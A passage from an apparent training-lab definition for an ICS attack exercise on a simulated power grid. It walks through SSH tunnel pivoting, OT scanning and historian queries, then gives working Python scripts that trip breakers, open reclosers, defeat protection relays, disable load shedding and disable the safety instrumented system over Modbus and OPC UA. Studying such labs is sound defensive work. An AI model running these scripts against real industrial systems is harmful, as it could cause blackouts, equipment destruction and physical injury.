\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  encrypted   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  encrypted   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  jump-host    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                                                   connects to\nlocalhost:2222 \u2192 jump-host:22                                     eng-ws-ot:22\nlocalhost:3333 \u2192 eng-ws-ot:22 (through two hops!)\n```\n\n### Deploy Your SSH Key to Eng-WS-OT\n\n```bash\nssh-copy-id -o StrictHostKeyChecking=no -p 3333 jsmith@localhost\n```\n\n### Test the Full Chain\n\n```bash\nssh -o StrictHostKeyChecking=no -p 3333 jsmith@localhost 'echo \"Reached eng-ws-ot!\" && hostname && ip addr show eth0 | grep \"inet \"'\n```\n\nYou should see an IP in the `172.16.3.x` range. **You just connected to a host on the OT operations network \u2014 three networks deep \u2014 by connecting to localhost:3333.**\n\n### Summary: Your Tunnel Map\n\nYou now have three tunnels running simultaneously:\n\n```\nattacker localhost:9050  (SOCKS)  \u2550\u2550\u2550\u25b6 corp-web \u2550\u2550\u2550\u25b6 [anywhere corp-web can reach]\nattacker localhost:2222  (-L)     \u2550\u2550\u2550\u25b6 corp-web \u2550\u2550\u2550\u25b6 jump-host:22\nattacker localhost:3333  (-L)     \u2550\u2550\u2550\u25b6 corp-web \u2550\u2550\u2550\u25b6 jump-host \u2550\u2550\u2550\u25b6 eng-ws-ot:22\n```\n\nVerify all tunnels are running:\n\n```bash\nss -tlnp | grep -E '9050|2222|3333'\n```\n\nYou should see three SSH listeners. Each one is a portal into a deeper network zone.\n\n> **Real-world parallel:** This is exactly how APT groups like **Sandworm** (Ukraine grid attacks, 2015/2016) and **XENOTIME** (TRITON/TRISIS) established persistent access deep into OT networks. Each compromised host becomes a stepping stone, and all traffic is encrypted within nested SSH sessions. From the outside, all a defender sees is one SSH connection from the internet to corp-web.\n\n**MITRE ATT&CK:** [T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/), [T0886 - Remote Services](https://attack.mitre.org/techniques/T0886/)"
          }
        ]
      },
      {
        "id": "phase6",
        "name": "DMZ Reconnaissance",
        "steps": [
          {
            "id": "step6_1",
            "vm": "attacker",
            "title": "Explore the IT/OT DMZ",
            "content": "Using your SSH tunnel from Phase 5, you can now explore the IT/OT DMZ from the attacker VM without switching to a different VNC window.\n\n### Understanding the IT/OT DMZ\n\nIn the Purdue Model, Level 3.5 is the **IT/OT DMZ** \u2014 a critical boundary zone that separates corporate IT systems (Levels 4-5) from operational technology (Levels 0-3). In a well-designed architecture:\n\n- IT systems **cannot** communicate directly with OT systems\n- All data crosses the boundary through **specific, controlled services** in the DMZ (data historians, jump hosts, patch servers)\n- The DMZ hosts are the only systems with network routes to both sides\n\nIn a real attack, you would reach this jump host using the VPN or AD credentials harvested earlier. The jump host exists precisely to provide authorized IT-to-OT connectivity \u2014 which also makes it the ideal pivot point for an attacker.\n\n### Map Your New Network Position\n\n### Scan the DMZ Through Your Tunnel\n\nUse proxychains to scan the DMZ through your SOCKS proxy:\n\n```bash\nproxychains4 -q -f ~/proxychains.conf nmap -Pn -sT -p 8080,22,80,443 172.16.2.1-30 --open\n```\n\n> **Note:** Only TCP connect scans (`-sT`) work through a SOCKS proxy. SYN scans, UDP scans, and ICMP pings do not work through proxychains.\n\nYou should find another host running a web service. This is likely a **historian mirror** \u2014 a common DMZ component that replicates OT process data for IT-side consumption (for business reporting, compliance dashboards, etc.).\n\nQuery it and examine what data it exposes:\n\n```bash\nproxychains4 -q -f ~/proxychains.conf curl -s http://172.16.2.20:8080/api/plcs | python3 -m json.tool\nproxychains4 -q -f ~/proxychains.conf curl -s http://172.16.2.20:8080/api/latest | python3 -m json.tool | head -40\n```\n\n> **Why this is a goldmine:** The historian mirror is *designed* to make OT data available to the IT side. But from an attacker's perspective, it's an intelligence bonanza \u2014 it reveals the names of every PLC, what registers they have, what values are normal, and what the overall system looks like. You now have a complete map of the OT environment without having touched the OT network at all.\n\n### Test Cross-Zone Connectivity\n\nSee which OT networks are reachable from the DMZ:\n\nFrom your SSH config, you already know the jump-host can reach the operations network (you connected to eng-ws-ot through it in Phase 5). The next step is to start working on the OT engineering workstation.\n\n**MITRE ATT&CK:** [T0846 - Remote System Discovery](https://attack.mitre.org/techniques/T0846/), [T1046 - Network Service Scanning](https://attack.mitre.org/techniques/T1046/)"
          }
        ]
      },
      {
        "id": "phase7",
        "name": "IT-to-OT Pivot",
        "steps": [
          {
            "id": "step7_1",
            "vm": "eng-ws-ot",
            "title": "Access the OT Engineering Workstation",
            "content": "From the **attacker** VM, SSH into the OT engineering workstation through your tunnel chain:\n\n```bash\nssh -o StrictHostKeyChecking=no -p 3333 jsmith@localhost\n```\n\nRemember what's happening: you're connecting to **localhost:3333**, which you set up in Phase 5 as a local port forward that chains through corp-web \u2192 jump-host \u2192 eng-ws-ot. Three network hops, two firewalls crossed, one command.\n\n### The Significance of This Pivot\n\nYou have now crossed from IT into OT. This is the most critical boundary in industrial security \u2014 and in this lab, it's also the point where the attack becomes potentially *physically dangerous* in a real-world scenario.\n\nYou've demonstrated exactly how this pivot works \u2014 using harvested credentials (jsmith:Summer2024 from the WordPress/AD compromise) and SSH local port forwarding to chain through the DMZ jump host. In a real engagement, this same chain would be built using:\n- SSH with harvested credentials (exactly what you did)\n- Chisel or other HTTP-based tunnels if SSH is blocked\n- Exploiting shared services between network zones\n\nThe engineering workstation is the **most powerful machine in an OT network**. It's where engineers program PLCs, configure safety systems, and manage the process. Compromising it gives you the same access that a plant engineer has.\n\n### Verify Your Position and Reach\n\n```bash\nip addr show eth0\n```\n\nYou should see an IP in the `172.16.3.0/24` range \u2014 the Operations network (Purdue Level 3).\n\nNow test which OT zones you can reach:\n\n```bash\n# Can you reach the Process Control network (L1)?\nping -c 1 172.16.5.20\n\n# Can you reach the Supervisory/HMI network (L2)?\nping -c 1 172.16.4.10\n```\n\n> **Think about it:** In a properly segmented OT environment, the engineering workstation should have *restricted* access to L1/L2 \u2014 perhaps only to specific devices on specific ports during maintenance windows. If you can freely ping and connect to everything, that's a segmentation failure that you'd flag in a pentest report.\n\nThe eng-ws-ot comes pre-loaded with ICS tools that a real OT engineer would have:\n- **pymodbus** \u2014 Modbus TCP client library\n- **asyncua** \u2014 OPC UA client library\n- **nmap** \u2014 with ICS-specific NSE scripts (modbus-discover, enip-info)\n- **curl** \u2014 for querying web-based historian and HMI interfaces\n\n**MITRE ATT&CK:** [T0886 - Remote Services](https://attack.mitre.org/techniques/T0886/), [T1021.004 - Remote Services: SSH](https://attack.mitre.org/techniques/T1021/004/)"
          }
        ]
      },
      {
        "id": "phase8",
        "name": "OT Network Discovery",
        "steps": [
          {
            "id": "step8_1",
            "vm": "eng-ws-ot",
            "title": "Discover ICS Devices and Protocols",
            "content": "Now you need to map the OT environment. You have partial intelligence from the historian mirror (Phase 5), but you should verify it firsthand and look for devices the historian might not monitor.\n\n### Scanning for ICS Protocols\n\nICS devices speak specific industrial protocols on well-known ports. Knowing these ports is essential for OT penetration testing:\n\n| Port | Protocol | Significance |\n|------|----------|--------------|\n| 502 | Modbus TCP | Most common ICS protocol \u2014 PLCs, RTUs, meters |\n| 44818 | EtherNet/IP (CIP) | Rockwell/Allen-Bradley PLCs |\n| 4840 | OPC UA | Modern ICS communication, sometimes with security features |\n| 20000 | DNP3 | Distribution automation and SCADA |\n| 8080 | HTTP | HMI web interfaces, historian APIs |\n\n> **Think about it:** Unlike IT scanning where you might scan all 65,535 ports, ICS scanning should be **targeted and cautious**. Aggressive scans can crash PLCs or cause process disruptions. In a real OT pentest, you would coordinate with plant operators and scan only specific ports.\n\nScan the process control network:\n\n```bash\nnmap -Pn -sT -p 502,20000,44818,4840,8080 172.16.5.1-100 --open\n```\n\nScan the supervisory/HMI network:\n\n```bash\nnmap -Pn -sT -p 8080,502,4840,80,443 172.16.4.1-50 --open\n```\n\n### Deeper Protocol Enumeration\n\nOnce you've found devices, use protocol-specific nmap scripts to learn more about them. These scripts speak the actual ICS protocol to extract device information:\n\n```bash\n# Modbus device identification \u2014 what firmware and model?\nnmap -Pn -sT -p 502 --script modbus-discover 172.16.5.20\n\n# EtherNet/IP device info \u2014 vendor, product name, serial number\nnmap -Pn -sT -p 44818 --script enip-info 172.16.5.30\n```\n\n> **What you're building:** By combining your scan results with the historian data from Phase 5, you should now have a complete inventory of every ICS device, what protocol it speaks, what network it's on, and what process it controls. This is exactly the kind of asset inventory that many real OT environments lack \u2014 and that attackers need to plan their attacks.\n\n**MITRE ATT&CK:** [T0846 - Remote System Discovery](https://attack.mitre.org/techniques/T0846/), [T0842 - Network Sniffing](https://attack.mitre.org/techniques/T0842/)"
          }
        ]
      },
      {
        "id": "phase9",
        "name": "Process Intelligence Gathering",
        "steps": [
          {
            "id": "step9_1",
            "vm": "eng-ws-ot",
            "title": "Query the Process Historian",
            "content": "Before attacking any ICS device, a sophisticated adversary gathers **process intelligence** \u2014 understanding what the system does, what normal looks like, and what parameters matter. Attacking blindly risks triggering alarms or causing unintended consequences.\n\nThe process historian (172.16.3.10) collects and stores data from all PLCs. Unlike the DMZ mirror you saw in Phase 5, this is the *real* historian on the operations network \u2014 it likely has more detailed and real-time data.\n\n### Query the Historian API\n\n```bash\n# What PLCs does the historian monitor?\ncurl -s http://172.16.3.10:8080/api/plcs | python3 -m json.tool\n\n# Get the latest readings from all PLCs\ncurl -s http://172.16.3.10:8080/api/latest | python3 -m json.tool\n```\n\n> **What to look for in the data:**\n> - **Register names** \u2014 They tell you what each PLC controls (e.g., `Breaker_1_Status`, `Overcurrent_Trip_A`, `SIS_Armed`)\n> - **Current values** \u2014 What's \"normal\" for each parameter (e.g., frequency should be ~60 Hz, voltages around their nominal rating)\n> - **Status fields** \u2014 Anything that's `1` or `0` is likely a boolean (enabled/disabled, open/closed)\n> - **Threshold values** \u2014 Parameters like `Overcurrent_Trip_A = 1200` tell you the safety limits\n\nYou can also pull historical trends:\n```bash\ncurl -s 'http://172.16.3.10:8080/api/history?plc=plc-gen&minutes=10' | \\\n  python3 -c \"import sys,json; d=json.load(sys.stdin); print(f'{len(d)} readings')\"\n```\n\n> **Why this matters for attack planning:** The historian data reveals exactly which registers to target, what their current values are, and what values would constitute an effective attack. It's the difference between randomly changing things (which might do nothing) and surgically modifying the exact parameters that control grid stability.\n\n**MITRE ATT&CK:** [T0801 - Monitor Process State](https://attack.mitre.org/techniques/T0801/), [T0868 - Detect Operating Mode](https://attack.mitre.org/techniques/T0868/)"
          },
          {
            "id": "step9_2",
            "vm": "eng-ws-ot",
            "title": "Access HMI Dashboards",
            "content": "**Human-Machine Interfaces (HMIs)** are the operator's window into the process. They display real-time values, alarm states, and control options. Accessing them tells you exactly what operators see \u2014 and later, whether your attacks are visible.\n\nFrom your Phase 7 scans, you should have found HMIs on the supervisory network (172.16.4.x). These typically run web interfaces on port 8080.\n\nQuery them from the command line to see what data they expose:\n\n```bash\n# Check each HMI you discovered\ncurl -s http://172.16.4.10:8080/ | grep -oE '<h[12]>[^<]+' | head -5\ncurl -s http://172.16.4.20:8080/ | grep -oE 'Turbine_Speed_RPM|Generator_Output_MW|Frequency_Hz' | head -5\ncurl -s http://172.16.4.30:8080/ | grep -oE '<h2>[^<]+' | head -10\n```\n\nFor the full visual experience, open **Firefox** on the eng-ws-ot desktop and browse to each HMI:\n- **http://172.16.4.10:8080** \u2014 Substation Operations\n- **http://172.16.4.20:8080** \u2014 Generation Plant Control\n- **http://172.16.4.30:8080** \u2014 Grid Overview / EMS Display\n\n> **What to observe:**\n> - What values are displayed to operators?\n> - Are there any alarm indicators? What thresholds trigger them?\n> - How frequently does the display update? (This tells you how quickly an operator would notice changes)\n> - Is there any authentication required to view the HMI? What about to *control* things from the HMI?\n\nNote the normal operating ranges \u2014 when you execute attacks later, you'll refer back to these to understand whether your changes would be immediately obvious to an operator.\n\n**MITRE ATT&CK:** [T0831 - Manipulation of View](https://attack.mitre.org/techniques/T0831/)"
          }
        ]
      },
      {
        "id": "phase10",
        "name": "Modbus PLC Reconnaissance",
        "steps": [
          {
            "id": "step10_1",
            "vm": "eng-ws-ot",
            "title": "Read All Modbus PLC Registers",
            "content": "Now it's time to interact directly with the PLCs using their native industrial protocols. Most of the PLCs in this lab use **Modbus TCP** \u2014 the most widely deployed ICS protocol.\n\n### Understanding Modbus TCP\n\nModbus was designed in 1979 for serial communication between PLCs. Key things to know:\n\n- **No authentication whatsoever** \u2014 Anyone who can reach the port can read and write registers\n- **No encryption** \u2014 All data is plaintext on the wire\n- **Register-based** \u2014 Data is organized into numbered \"holding registers\" (16-bit integers, addresses 0-65535)\n- **Read/Write** \u2014 Function code 3 reads registers, function code 6 writes a single register\n- **Slave ID** \u2014 Each device has a unit ID (typically 1)\n\n> **Why is this important?** Modbus has no concept of \"authorized\" vs \"unauthorized\" access. If your TCP packet reaches the PLC, the PLC will happily execute whatever command you send. This is by design \u2014 the protocol assumes the network itself provides security (network segmentation, firewalls). When that segmentation fails, as it has in this lab, every PLC is wide open.\n\n### Reading PLC Registers\n\nUsing the register names you discovered from the historian in Phase 8, you can now read the PLCs directly. The following script reads from all four Modbus PLCs and labels the registers based on historian data:\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\n\nplcs = {\n    'plc-sub-a (Protection Relay)': ('172.16.5.10', {\n        0: 'Bus_Voltage_kV', 1: 'Line_Current_A', 2: 'Frequency_Hz',\n        3: 'Power_Factor', 10: 'Overcurrent_Trip_A',\n        11: 'Distance_Prot_Zone1_Ohm', 12: 'Distance_Prot_Zone2_Ohm',\n        20: 'Autorecloser_Enabled', 21: 'Autorecloser_Delay_ms',\n        30: 'Protection_Status'\n    }),\n    'plc-sub-b (Breaker Control)': ('172.16.5.20', {\n        0: 'Breaker_1_Status', 1: 'Breaker_2_Status',\n        2: 'Breaker_3_Status', 3: 'Bus_Tie_Status',\n        10: 'Bus_A_Voltage_kV', 11: 'Bus_B_Voltage_kV',\n        20: 'Cap_Bank_1_Status', 21: 'Cap_Bank_2_Status'\n    }),\n    'plc-load (Load Management)': ('172.16.5.40', {\n        0: 'Total_Load_MW', 1: 'Total_Generation_MW',\n        2: 'System_Frequency_Hz', 3: 'Reserve_Margin_MW',\n        10: 'Load_Shed_Stage_1_MW', 11: 'Load_Shed_Stage_2_MW',\n        12: 'Load_Shed_Stage_3_MW', 13: 'Freq_Trigger_Stage1_Hz',\n        14: 'Freq_Trigger_Stage2_Hz', 20: 'Auto_Shed_Enabled'\n    }),\n    'rtu-dist (Distribution RTU)': ('172.16.5.60', {\n        0: 'Feeder_1_Voltage_kV', 1: 'Feeder_2_Voltage_kV',\n        2: 'Feeder_3_Voltage_kV', 10: 'Recloser_1_Status',\n        11: 'Recloser_2_Status', 12: 'Recloser_3_Status',\n        20: 'Voltage_Regulator_Tap', 21: 'Cap_Bank_Status'\n    })\n}\n\nfor name, (ip, regs) in plcs.items():\n    print(f'\\n=== {name} ({ip}:502) ===')\n    client = ModbusTcpClient(ip, port=502, timeout=5)\n    client.connect()\n    result = client.read_holding_registers(0, 42, slave=1)\n    if not result.isError():\n        for addr in sorted(regs):\n            print(f'  [{addr:3d}] {regs[addr]:30s} = {result.registers[addr]}')\n    else:\n        print(f'  ERROR: {result}')\n    client.close()\nEOF\n```\n\n### Analyze What You've Found\n\n> **Think about it:** Look at the register values and consider:\n> - Which registers are **status/measurement** values (read-only in practice \u2014 like bus voltage, line current)?\n> - Which registers are **control/configuration** values (things an attacker would want to change \u2014 like breaker status, trip thresholds, enable/disable flags)?\n> - What would happen to the physical grid if you changed `Breaker_1_Status` from `1` (closed) to `0` (open)?\n> - What would happen if you raised `Overcurrent_Trip_A` from `1200` to `9999`? The protection relay would never trip, even during a dangerous fault.\n\nRecord the baseline values of all control registers \u2014 you'll need to restore these after the attack phase.\n\n**MITRE ATT&CK:** [T0802 - Automated Collection](https://attack.mitre.org/techniques/T0802/), [T0861 - Point & Tag Identification](https://attack.mitre.org/techniques/T0861/)"
          }
        ]
      },
      {
        "id": "phase11",
        "name": "OPC UA Safety System Reconnaissance",
        "steps": [
          {
            "id": "step11_1",
            "vm": "eng-ws-ot",
            "title": "Browse the Safety Instrumented System",
            "content": "The last PLC to explore uses a different protocol \u2014 **OPC UA** (Open Platform Communications Unified Architecture). This is the Safety Instrumented System (SIS) controller.\n\n### Understanding OPC UA vs Modbus\n\nOPC UA is a more modern protocol than Modbus with key differences:\n\n| Feature | Modbus | OPC UA |\n|---------|--------|--------|\n| Data model | Flat numbered registers | Hierarchical node tree |\n| Data types | 16-bit integers only | Rich types (double, string, bool, etc.) |\n| Discovery | Must know register addresses | Can browse the entire data model |\n| Security | None | Supports certificates, encryption, authentication |\n| Port | 502 | 4840 |\n\n> **Think about it:** OPC UA *supports* security features like X.509 certificates and encrypted sessions. The question is whether they're actually *enabled* on this particular device. Many OT environments disable OPC UA security because it complicates commissioning and maintenance. This is one of the things you need to determine.\n\n### Understanding the Safety Instrumented System (SIS)\n\nThe SIS is the **last line of defense** in an industrial process. While normal control systems optimize production, the SIS exists solely to prevent catastrophic failures:\n- Overspeed shutdown if a turbine exceeds safe RPM\n- Overcurrent protection to prevent generator damage\n- Overtemperature protection for stator windings\n- Emergency stop capability\n\nThe SIS is independent from the main process control system so that a failure or compromise of the DCS (Distributed Control System) doesn't also take out the safety system. In theory. In practice...\n\n### Browse the OPC UA Node Tree\n\n```bash\npython3 << 'EOF'\nimport asyncio\nfrom asyncua import Client\n\nasync def main():\n    client = Client('opc.tcp://172.16.5.50:4840', timeout=15)\n    await asyncio.wait_for(client.connect(), timeout=10)\n    try:\n        ns = await client.get_namespace_array()\n        print(f'Namespaces: {ns}')\n        print(f'PLC namespace: {ns[2]}')\n\n        objects = client.get_objects_node()\n        children = await objects.get_children()\n        for child in children:\n            name = await child.read_browse_name()\n            if 'Server' in str(name):\n                continue\n            print(f'\\n=== {name.Name} ===')\n            variables = await child.get_children()\n            for var in variables:\n                vname = await var.read_browse_name()\n                try:\n                    val = await var.read_value()\n                    print(f'  {vname.Name:30s} = {val}')\n                except:\n                    print(f'  {vname.Name:30s} = (unreadable)')\n    finally:\n        await client.disconnect()\n\nasyncio.run(main())\nEOF\n```\n\n> **Notice something critical:** The connection succeeded without any certificates, tokens, or credentials. The OPC UA server has **anonymous access enabled**. In a security-conscious deployment, this would require at minimum a username/password, and ideally X.509 certificate-based authentication. This is a critical finding.\n\n### Analyze the SIS Variables\n\nExamine each variable and classify it:\n- **Armed/Enabled flags** (values of `1.0`) \u2014 These are the safety system's \"on switches.\" Setting them to `0.0` disables that protection.\n- **Trip thresholds** (like `Overspeed_Trip_RPM = 3780.0`) \u2014 These define when the safety system activates. Raising them above what the process can physically reach effectively disables the protection.\n- **Live measurements** (like `Turbine_Speed_RPM`, `Stator_Temp_C`) \u2014 Read-only process values the SIS monitors.\n\n> **Think about it:** If you were planning an attack that would push the turbine beyond safe speeds, what would you need to do first? You'd need to either (a) set `SIS_Armed` to `0.0` to disable the entire SIS, or (b) raise `Overspeed_Trip_RPM` above whatever speed you plan to reach, so the trip never activates. This is exactly what the TRITON/TRISIS malware attempted at a Saudi petrochemical plant in 2017.\n\n**MITRE ATT&CK:** [T0846 - Remote System Discovery](https://attack.mitre.org/techniques/T0846/), [T0861 - Point & Tag Identification](https://attack.mitre.org/techniques/T0861/)"
          }
        ]
      },
      {
        "id": "phase12",
        "name": "Attack - Breaker Manipulation",
        "steps": [
          {
            "id": "step12_1",
            "vm": "eng-ws-ot",
            "title": "Trip Substation Breakers",
            "content": "**ATTACK PHASE BEGINS**\n\nYou have now completed the reconnaissance lifecycle \u2014 you know every device, every protocol, every register, and every normal operating value. It's time to execute the attack.\n\n### Attack Strategy\n\nThe goal is to cause a **cascading grid failure** by:\n1. **Opening circuit breakers** \u2014 Disconnecting loads and generation from the grid\n2. **Disabling protection systems** \u2014 Preventing automatic fault recovery\n3. **Disabling the SIS** \u2014 Removing the safety net that prevents equipment damage\n\nThis mirrors the attack sequence used in **CRASHOVERRIDE** (2016 Ukraine power grid attack) and **Industroyer2** (2022 Ukraine).\n\n### Opening the Breakers\n\nCircuit breakers are the switches that connect or disconnect parts of the power grid. In the `plc-sub-b` controller:\n- Register value `1` = breaker **closed** (circuit connected, power flowing)\n- Register value `0` = breaker **open/tripped** (circuit disconnected, no power)\n\n> **Important technical note:** The PLC simulation runs a control loop every ~1 second that may reset external writes back to simulated values. To maintain your attack state, you need a **sustained write loop** \u2014 continuously writing your attack values. This actually mirrors real-world attacks: CRASHOVERRIDE used a wiper component to continuously send open commands to prevent operators from re-closing breakers.\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\nimport time\n\nclient = ModbusTcpClient('172.16.5.20', port=502, timeout=5)\nclient.connect()\n\n# Read baseline state first\nresult = client.read_holding_registers(0, 4, slave=1)\nprint(f'BEFORE: Breakers = {result.registers}')\nprint(f'  Breaker_1={result.registers[0]} Breaker_2={result.registers[1]}')\nprint(f'  Breaker_3={result.registers[2]} Bus_Tie={result.registers[3]}')\n\nprint('\\nATTACK: Tripping all breakers...')\nfor i in range(10):  # Sustained write for 10 seconds\n    client.write_register(0, 0, slave=1)  # Trip Breaker 1\n    client.write_register(1, 0, slave=1)  # Trip Breaker 2\n    client.write_register(2, 0, slave=1)  # Trip Breaker 3\n    client.write_register(3, 0, slave=1)  # Open Bus Tie\n    result = client.read_holding_registers(0, 4, slave=1)\n    print(f'  [{i+1:2d}s] Breakers = {result.registers}')\n    time.sleep(1)\n\nprint('\\nAttack complete. Substation de-energized.')\nclient.close()\nEOF\n```\n\n> **Think about it:** While this script runs, open the Substation HMI at `http://172.16.4.10:8080` in Firefox. Watch how the breaker states change in real time. Consider: would an operator notice immediately? How long would it take to diagnose that this is a cyber attack vs. a legitimate fault?\n\n**MITRE ATT&CK:** [T0855 - Unauthorized Command Message](https://attack.mitre.org/techniques/T0855/), [T0836 - Modify Parameter](https://attack.mitre.org/techniques/T0836/)"
          },
          {
            "id": "step12_2",
            "vm": "eng-ws-ot",
            "title": "Open Distribution Reclosers",
            "content": "### Why Target Reclosers?\n\n**Reclosers** are automatic switches on distribution feeders that close back after a temporary fault (like a tree branch touching a line). They're designed to restore power automatically within seconds.\n\nIf an attacker opens breakers but leaves reclosers functional, the system might **automatically recover**. By opening the reclosers too, you prevent automatic fault restoration \u2014 forcing manual intervention that could take hours.\n\n> **Real-world parallel:** In the 2015 and 2016 Ukraine attacks, the attackers not only opened breakers but also overwrote firmware on serial-to-Ethernet converters, preventing remote re-closing. The intent was the same: maximize the time customers are without power.\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\nimport time\n\nclient = ModbusTcpClient('172.16.5.60', port=502, timeout=5)\nclient.connect()\n\nresult = client.read_holding_registers(10, 3, slave=1)\nprint(f'BEFORE: Reclosers = {result.registers}')\n\nprint('ATTACK: Opening all distribution reclosers...')\nfor i in range(10):\n    client.write_register(10, 0, slave=1)  # Open Recloser 1\n    client.write_register(11, 0, slave=1)  # Open Recloser 2\n    client.write_register(12, 0, slave=1)  # Open Recloser 3\n    result = client.read_holding_registers(10, 3, slave=1)\n    print(f'  [{i+1:2d}s] Reclosers = {result.registers}')\n    time.sleep(1)\n\nclient.close()\nEOF\n```\n\n**MITRE ATT&CK:** [T0855 - Unauthorized Command Message](https://attack.mitre.org/techniques/T0855/)"
          }
        ]
      },
      {
        "id": "phase13",
        "name": "Attack - Disable Protection Systems",
        "steps": [
          {
            "id": "step13_1",
            "vm": "eng-ws-ot",
            "title": "Defeat Protection Relay Settings",
            "content": "### Why Disable Protection?\n\nProtection relays are the power grid's \"immune system.\" They automatically detect abnormal conditions (overcurrent, overvoltage, frequency deviation) and isolate the fault before it damages equipment or cascades.\n\nDisabling protection before causing a disturbance means:\n- Faults propagate instead of being isolated\n- Equipment can be damaged beyond repair\n- Cascading failures spread to neighboring substations\n\n> **Think about it:** There are two ways to defeat a protection relay:\n> 1. **Disable it outright** \u2014 Set enabled flags to 0\n> 2. **Raise thresholds to unreachable levels** \u2014 If the overcurrent trip is set to 9999A, it will never trigger because the equipment physically can't reach that current. The relay *thinks* it's still protecting, but it's functionally useless.\n>\n> Method 2 is stealthier \u2014 a quick glance at the HMI would show protection \"enabled\" even though it's been neutered.\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\nimport time\n\nclient = ModbusTcpClient('172.16.5.10', port=502, timeout=5)\nclient.connect()\n\n# Read current protection settings\nfor addr, name in [(10,'Overcurrent_Trip_A'), (20,'Autorecloser_Enabled'), (30,'Protection_Status')]:\n    r = client.read_holding_registers(addr, 1, slave=1)\n    print(f'BEFORE: [{addr}] {name} = {r.registers[0]}')\n\nprint('\\nATTACK: Disabling protection systems...')\nfor i in range(10):\n    client.write_register(10, 9999, slave=1)  # Overcurrent threshold unreachable\n    client.write_register(20, 0, slave=1)     # Autorecloser disabled\n    client.write_register(30, 0, slave=1)     # Protection disabled\n    r1 = client.read_holding_registers(10, 1, slave=1)\n    r2 = client.read_holding_registers(20, 1, slave=1)\n    r3 = client.read_holding_registers(30, 1, slave=1)\n    print(f'  [{i+1:2d}s] OC_Trip={r1.registers[0]} Autorecloser={r2.registers[0]} Protection={r3.registers[0]}')\n    time.sleep(1)\n\nclient.close()\nEOF\n```\n\n**MITRE ATT&CK:** [T0836 - Modify Parameter](https://attack.mitre.org/techniques/T0836/), [T0816 - Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816/)"
          },
          {
            "id": "step13_2",
            "vm": "eng-ws-ot",
            "title": "Disable Automatic Load Shedding",
            "content": "### What is Load Shedding?\n\n**Load shedding** is an automated defense mechanism that deliberately disconnects non-critical loads when the grid frequency drops below safe thresholds. It's the grid's \"emergency pressure relief valve\":\n- **Stage 1** (typically ~59 Hz): Shed ~10% of load\n- **Stage 2** (typically ~58 Hz): Shed ~20% more\n- **Stage 3** (critical): Shed everything possible to prevent total grid collapse\n\nIf generation suddenly drops (e.g., because you tripped breakers at a power plant), frequency will fall. Without load shedding, the remaining generators get overloaded, slow down further, and you get a cascading blackout.\n\n> **Think about it:** How would you disable load shedding? You could set `Auto_Shed_Enabled` to 0, but you could also take a subtler approach: lower the frequency triggers to values that could never be reached (e.g., 40 Hz and 35 Hz). The system *appears* to be protecting, but it will never actually trigger.\n\n```bash\npython3 << 'EOF'\nfrom pymodbus.client import ModbusTcpClient\nimport time\n\nclient = ModbusTcpClient('172.16.5.40', port=502, timeout=5)\nclient.connect()\n\nfor addr, name in [(0,'Total_Load_MW'), (1,'Total_Gen_MW'), (2,'Sys_Freq_Hz'),\n                   (20,'Auto_Shed_Enabled'), (13,'Freq_Trig_Stage1'), (14,'Freq_Trig_Stage2')]:\n    r = client.read_holding_registers(addr, 1, slave=1)\n    print(f'BEFORE: [{addr}] {name} = {r.registers[0]}')\n\nprint('\\nATTACK: Disabling load shedding...')\nfor i in range(10):\n    client.write_register(20, 0, slave=1)   # Disable auto shed\n    client.write_register(13, 40, slave=1)  # Stage 1 trigger unreachable\n    client.write_register(14, 35, slave=1)  # Stage 2 trigger unreachable\n    r = client.read_holding_registers(20, 1, slave=1)\n    print(f'  [{i+1:2d}s] Auto_Shed={r.registers[0]}')\n    time.sleep(1)\n\nprint('\\nLoad shedding disabled. Grid cannot protect against frequency deviation.')\nclient.close()\nEOF\n```\n\n**MITRE ATT&CK:** [T0836 - Modify Parameter](https://attack.mitre.org/techniques/T0836/), [T0831 - Manipulation of Control](https://attack.mitre.org/techniques/T0831/)"
          }
        ]
      },
      {
        "id": "phase14",
        "name": "Attack - Safety System Bypass",
        "steps": [
          {
            "id": "step14_1",
            "vm": "eng-ws-ot",
            "title": "Disable the Safety Instrumented System via OPC UA",
            "content": "### The Most Dangerous Attack\n\nThis is the most severe action in the entire exercise. The Safety Instrumented System is the **last line of defense** between a cyber attack and physical equipment destruction.\n\nIn a real power plant:\n- Disabling overspeed protection \u2192 Turbine can exceed mechanical limits \u2192 Catastrophic turbine failure, potential flying debris\n- Disabling overcurrent protection \u2192 Generator windings overheat \u2192 Fire or permanent damage\n- Disabling overtemperature protection \u2192 Stator insulation fails \u2192 Generator replacement ($millions, months of downtime)\n\n> **Real-world parallel:** The **TRITON/TRISIS** malware (2017) was discovered targeting Schneider Electric Triconex safety controllers at a Saudi Arabian petrochemical facility. The attackers spent years positioning themselves in the network before attempting to reprogram the SIS. Their goal: disable the safety system, then cause a hazardous process condition. A bug in their malware caused the SIS to trip to a safe state, which exposed the attack. If it had worked, the result could have been an explosion.\n\n### Executing the SIS Bypass\n\nUsing the OPC UA client, disable all safety functions:\n\n```bash\npython3 << 'EOF'\nimport asyncio\nfrom asyncua import Client, ua\n\nasync def main():\n    client = Client('opc.tcp://172.16.5.50:4840', timeout=15)\n    await asyncio.wait_for(client.connect(), timeout=10)\n    try:\n        objects = client.get_objects_node()\n        children = await objects.get_children()\n\n        for child in children:\n            name = await child.read_browse_name()\n            if 'Safety' not in str(name):\n                continue\n\n            variables = await child.get_children()\n            print('=== BEFORE ATTACK ===')\n            var_map = {}\n            for var in variables:\n                vname = await var.read_browse_name()\n                val = await var.read_value()\n                var_map[vname.Name] = var\n                print(f'  {vname.Name:30s} = {val}')\n\n            print('\\n=== ATTACK: Disabling SIS ===')\n            attacks = [\n                ('SIS_Armed', 0.0),\n                ('Overspeed_Trip_Enabled', 0.0),\n                ('Generator_Prot_Enabled', 0.0),\n                